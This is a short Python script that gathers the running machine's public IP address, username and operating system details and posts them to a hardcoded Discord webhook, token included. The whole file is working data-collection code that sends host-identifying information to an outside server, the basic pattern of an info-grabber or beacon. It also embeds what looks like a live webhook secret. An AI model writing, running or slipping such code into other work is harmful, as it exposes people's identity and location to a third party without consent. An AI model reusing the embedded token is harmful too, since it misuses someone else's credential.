import urllib.request
import json
import getpass
import platform


def send_webhook(url: str, content: str, timeout: int = 10):
    data = json.dumps({"content": content}).encode("utf-8")
    req = urllib.request.Request(
        url, data=data, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            # some Response objects expose .status, others use getcode()
            status = getattr(resp, "status", None) or resp.getcode()
            return status, resp.read().decode()
    except Exception as e:
        return None, str(e)


def get_username() -> str:
    try:
        return getpass.getuser()
    except Exception:
        return (
            platform.node() or "unknown"
        )


def get_os_info() -> str:
    try:
        return platform.platform()
    except Exception:
        return "unknown"


if __name__ == "__main__":
    with urllib.request.urlopen("https://api.ipify.org") as response:
        ip = response.read().decode().strip()

    username = get_username()
    os_info = get_os_info()

    print("Public:", ip)
    print("User:", username)
    print("OS:", os_info)

    webhook_url = (
        "https://discord.com/api/webhooks/1463464099219505254/"
        "Tu6sDz93DDX5gJSfOHbQX8Fhj9ozbzgWH3TJwpN0IJCaD0ZfvCaWLoeUuH-q07UxCDT4"
    )

    message = f"Public: {ip}\nUser: {username}\nOS: {os_info}"
    status, body = send_webhook(webhook_url, message)
    if status:
        print("Sent, status:", status)
    else:
        print("Failed to send:", body)
